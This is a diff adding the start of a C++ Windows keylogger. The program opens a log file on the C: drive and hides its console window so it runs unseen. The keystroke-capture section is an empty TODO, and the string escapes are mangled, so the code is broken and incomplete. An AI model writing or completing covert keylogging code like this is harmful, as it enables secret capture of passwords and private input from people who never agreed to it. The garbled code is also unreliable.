@@ -1,0 +1,32 @@
+#include <iostream>
+#include <windows.h>
+#include <fstream>
+#include <time.h>
+using namespace std;
+
+int main()
+{
+bool runlogger= true;
+ofstream log;
+//where your logs will be stored
+
+log.open("C:\log.txt", ofstream::out);
+//displaying error message when unable to open file
+if(log.fail())
+{
+printf("Error in opening log.txt filen");
+}
+//code for hiding running dialog
+HWND hideIt = FindWindow("ConsoleWindowClass", NULL);
+ShowWindow(hideIt, 0);
+//logic for capturing keystrokes...................................
+//TODO read code to understand
+
+
+
+
+
+
+
+
+
